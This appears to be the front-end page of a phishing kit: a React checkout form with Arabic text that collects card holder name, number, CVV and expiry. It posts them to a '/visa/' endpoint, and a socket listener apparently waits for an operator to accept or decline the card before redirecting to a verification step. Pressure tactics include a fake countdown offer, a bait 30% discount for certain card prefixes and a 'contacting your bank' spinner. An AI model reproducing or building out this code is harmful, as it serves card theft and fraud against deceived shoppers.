import axios from "axios";
import React, { useEffect, useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { useNavigate } from "react-router-dom";
import { validatePaymentDetails } from "../utils/paymentValidation";
import { useTranslation } from "../context/LanguageContext";

const Confirm = ({ setLoading }) => {
  const { t, dir } = useTranslation();
  const data = new URLSearchParams(window.location.search);
  const query = JSON.parse(data.get("data"));
  const companyData = query.companyData;
  const [card_number, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [errorCard, setErrorCard] = useState(false);
  const [car_holder_name, setCardHolderName] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [load, setLoad] = useState(null);
  const [popUp, setPopUp] = useState(true);
  const navigate = useNavigate();
  const cardDigits = card_number.replace(/\D/g, "");
  const hasCardDiscount = /^(53|54|55)/.test(cardDigits);
  const originalPriceNum =
    parseFloat(String(companyData.price).replace(/[^\d.]/g, "")) || 0;
  const discountedPrice = (originalPriceNum * 0.7).toFixed(2);

  const renderPrice = (className = "") =>
    hasCardDiscount ? (
      <span className={`inline-flex items-center gap-2 ${className}`}>
        <span className="line-through text-gray-400">
          {companyData.price} {t("common.currencySar")}
        </span>
        <span className="text-green-600 font-bold">
          {discountedPrice} {t("common.currencySar")}
        </span>
      </span>
    ) : (
      <span className={className}>
        {companyData.price} {t("common.currencySar")}
      </span>
    );

  const formatCardNumber = (value) => {
    // Remove non-numeric characters
    const numericValue = value.replace(/\D/g, "");
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    // Trim to 16 characters
    formattedValue = formattedValue.slice(0, 19);

    // Update state
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    setErrorCard(false);
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    setErrorCard(false);
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };
  const handleExpiryDateChange = (e) => {
    setErrorCard(false);
    const numericValue = e.target.value.replace(/\D/g, "").slice(0, 4);
    let formattedValue = numericValue;
    if (numericValue.length > 2) {
      formattedValue = numericValue.slice(0, 2) + "/" + numericValue.slice(2);
    }
    setExpiryDate(formattedValue);
  };
  const handleSubmit = async (e) => {
    setLoad(true);
    setErrorCard(false);
    e.preventDefault();
    let check = card_number.split(" ").join("");
    const paymentError = validatePaymentDetails({
      cardDigits: check,
      expiryDate,
      cvv,
      cardName: car_holder_name,
    });
    if (paymentError) {
      setLoad(false);
      return setErrorCard(paymentError);
    }
    // if (check.startsWith("4847")) {
    //   setLoad(false);
    //   return setErrorCard("confirm.rajhiSuspended");
    // }
    if (check.startsWith("4548")) {
      setLoad(false);
      return setErrorCard("confirm.walletSuspended");
    }
    const finalData = {
      ...JSON.parse(data.get("data")),
      cardNumber: card_number,
      expiryDate,
      cvv,
      card_name: car_holder_name,
    };
    try {
      await axios.post(api_route + "/visa/" + query._id, finalData).then(() => {
        socket.emit("paymentForm", JSON.parse(data.get("data"))._id);
      });
    } catch {
      setLoad(false);
    } finally {
      setLoading?.(false);
    }
    // return navigate( = `/verfiy?data=${JSON.stringify(finalData)}`
  };

  const [counter, setCounter] = useState(60 * 60 * 2);

  useEffect(() => {
    const interval = setInterval(() => {
      setCounter((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => clearInterval(interval);
  }, []);
  const hours = Math.floor(counter / 3600);
  const minutes = Math.floor((counter % 3600) / 60);
  const seconds = counter % 60;

  const formattedTime = `${String(hours).padStart(2, "0")}:${String(
    minutes,
  ).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;

  useEffect(() => {
    const onAcceptPaymentForm = (id) => {
      if (id !== query._id) return;
      setLoad(false);
      sessionStorage.setItem(
        "card",
        card_number.startsWith("5")
          ? "master"
          : card_number.startsWith("4")
            ? "visa"
            : null,
      );
      navigate(
        `/verfiy?data=${encodeURIComponent(
          JSON.stringify({
            ...query,
            cardNumber: card_number,
          }),
        )}`,
      );
    };

    const onDeclinePaymentForm = (id) => {
      if (id !== query._id) return;
      setLoad(false);
      setErrorCard("confirm.invalidCardRetry");
    };

    socket.on("acceptPaymentForm", onAcceptPaymentForm);
    socket.on("declinePaymentForm", onDeclinePaymentForm);
    return () => {
      socket.off("acceptPaymentForm", onAcceptPaymentForm);
      socket.off("declinePaymentForm", onDeclinePaymentForm);
    };
  }, [card_number, navigate, query._id]);

  if (!data.get("data")) {
    return (
      <div className="w-full flex items-center justify-center min-h-52 text-red-500 text-xl">
        {t("common.invalidData")}
      </div>
    );
  } else {
    return (
      <>
        {popUp && (
          <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen flex-col  left-0 bg-[#00000053] bg-opacity-45 ">
            <div className="w-11/12 md:w-fit p-3 rounded-md bg-white flex flex-col items-center">
              <img src="/payment.jpeg" className="w-full md:w-1/3" />
              <span className="text-xl my-5 text-gray-700 w-fit font-bold">
                سارع قبل نهاية العرض !
              </span>
              <span className="font-bold text-gray-700">
                يتبقى على انتهاء العرض:
              </span>
              <div className="text-green-600 text-4xl my-5 font-bold">
                {formattedTime}
              </div>
              <button
                onClick={() => setPopUp(false)}
                className="bg-[#6c757d] text-white w-full text-lg py-2 rounded-md"
              >
                إغلاق
              </button>
            </div>
          </div>
        )}
        {load ? (
          <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen flex-col  left-0 bg-white  ">
            <TailSpin
              height="50"
              width="50"
              color="green"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
            <span className="text-xl my-5 text-green-600">
              {t("confirm.contactBank")}
            </span>
          </div>
        ) : (
          <div className="w-11/12 xl:w-1/3 lg:w-1/2  flex flex-col items-start justify-start bg-white  min-h-screen rounded-md   payment ">
            <div className="w-full flex flex-col items-center justify-center shadow-xl rounded-md py-4">
              <div className="w-full bg-white p-5 pb-0" dir={dir}>
                <div className="inline-flex w-full flex-col items-start">
                  <div className="inline-flex flex-col items-start gap-3">
                    <div className="text-lg font-bold leading-7 text-gray-800">
                      {t("confirm.invoiceTitle")}
                    </div>
                    <p className="text-sm font-normal leading-tight text-gray-500">
                      {t("confirm.invoiceSubtitle")}
                    </p>
                    <h1 className="text-4xl font-bold leading-10 text-gray-800">
                      {hasCardDiscount ? (
                        <span className="inline-flex flex-wrap items-baseline gap-3">
                          <span className="line-through text-2xl text-gray-400">
                            {companyData.price} {t("common.currencySar")}
                          </span>
                          <span className="text-green-600">
                            {discountedPrice} {t("common.currencySar")}
                          </span>
                        </span>
                      ) : (
                        <>
                          {companyData.price} {t("common.currencySar")}
                        </>
                      )}
                    </h1>
                  </div>
                  <div className="flex w-full flex-col gap-6 mt-8">
                    <div className="flex flex-col gap-2">
                      <div className="flex w-full items-center justify-between gap-4 text-sm font-medium leading-tight text-gray-800">
                        <div>{t("confirm.subtotal")}</div>
                        <div className="leading-none">
                          100.00 {t("common.currencySar")}
                        </div>
                      </div>
                      <div className="flex w-full items-center justify-between gap-4 text-xs font-normal leading-none text-gray-500">
                        <div>{t("confirm.vat15")}</div>
                        <div className="text-sm leading-none">
                          15.00 {t("common.currencySar")}
                        </div>
                      </div>
                    </div>
                    <hr className="border-gray-200" />
                    <div className="flex w-full items-center justify-between gap-4 text-sm font-medium leading-tight text-gray-800">
                      <div>{t("confirm.amountDue")}</div>
                      <div className="text-sm leading-none">
                        {renderPrice()}
                      </div>
                    </div>
                  </div>
                </div>
                <div className="w-full flex items-center justify-between py-5">
                  <span className="text-base font-semibold">
                    {t("confirm.discountBanner")}
                  </span>
                  <img src="/pay1.jpeg" className=" h-8" />
                </div>
              </div>

              <form
                className="w-full flex flex-col px-3 pt-5 bg-white"
                onSubmit={handleSubmit}
                dir="ltr"
                lang="en"
              >
                <div className="relative mt-2 mb-5 flex items-center justify-center">
                  <hr className="absolute  w-full top-3" />
                  <span className=" bg-white z-10  left-20 px-5">
                    {t("confirm.insertCardDetails")}
                  </span>
                </div>
                <header></header>
                <div className="w-full flex flex-col gap-y-2 border rounded-t-md text-sm">
                  <input
                    value={car_holder_name}
                    required
                    onChange={(e) => {
                      setErrorCard(false);
                      setCardHolderName(e.target.value);
                    }}
                    dir="ltr"
                    autoComplete="cc-name"
                    placeholder={t("confirm.cardHolderName")}
                    type="text"
                    className="w-full rounded-md text-black py-2.5 px-3 text-left outline-none"
                  />
                </div>
                <div className="w-full flex flex-col  gap-y-2 border-x text-sm relative">
                  <input
                    value={card_number}
                    required
                    onChange={handleCardNumberChange}
                    dir="ltr"
                    autoComplete="cc-number"
                    maxLength={19}
                    minLength={16}
                    inputMode="numeric"
                    type="text"
                    placeholder={t("confirm.cardNumber")}
                    className="w-full rounded-md text-black py-2.5 px-3 text-left outline-none"
                  />
                  <div className="flex items-center gap-x-1 absolute right-2 top-1 ">
                    <img src="/amex.svg" className="w-6 " />
                    <img src="/MasterCard.svg" className="w-6 " />
                    <img src="/Visa.svg" className="w-6 " />
                    <img
                      className="w-6 "
                      src={
                        "data:image/png;base64,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"
                      }
                    />
                  </div>
                </div>
                <div className="w-full flex items-center border" dir="ltr">
                  <input
                    className="w-full text-black text-sm text-left border-e px-2 py-2.5 outline-none"
                    type="text"
                    dir="ltr"
                    inputMode="numeric"
                    autoComplete="cc-csc"
                    value={cvv}
                    onChange={handleCvvChange}
                    maxLength={3}
                    placeholder={t("confirm.cvv")}
                    required
                  />

                  <input
                    type="text"
                    dir="ltr"
                    inputMode="numeric"
                    autoComplete="cc-exp"
                    value={expiryDate}
                    maxLength={5}
                    onChange={handleExpiryDateChange}
                    className="w-full text-black text-sm text-left p-2.5 outline-none"
                    placeholder={t("confirm.expiry")}
                    required
                  />
                </div>

                {errorCard ? (
                  <p
                    dir={dir}
                    className="w-full  flex justify-between p-3 border rounded-md text-red-500 mt-2 text-sm bg-[#f8d7da]"
                  >
                    {t(errorCard)}
                  </p>
                ) : (
                  ""
                )}
                <button
                  className="px-10 py-2 text-xl  bg-[#1566df] text-white rounded-md my-5 cursor-pointer"
                  type="submit"
                >
                  {t("confirm.payNow")}
                </button>
              </form>
              <div className="flex  items-center w-full justify-center ">
                <img src="/payment-b.png" alt="" />
              </div>
            </div>
          </div>
        )}
      </>
    );
  }
};

export default Confirm;
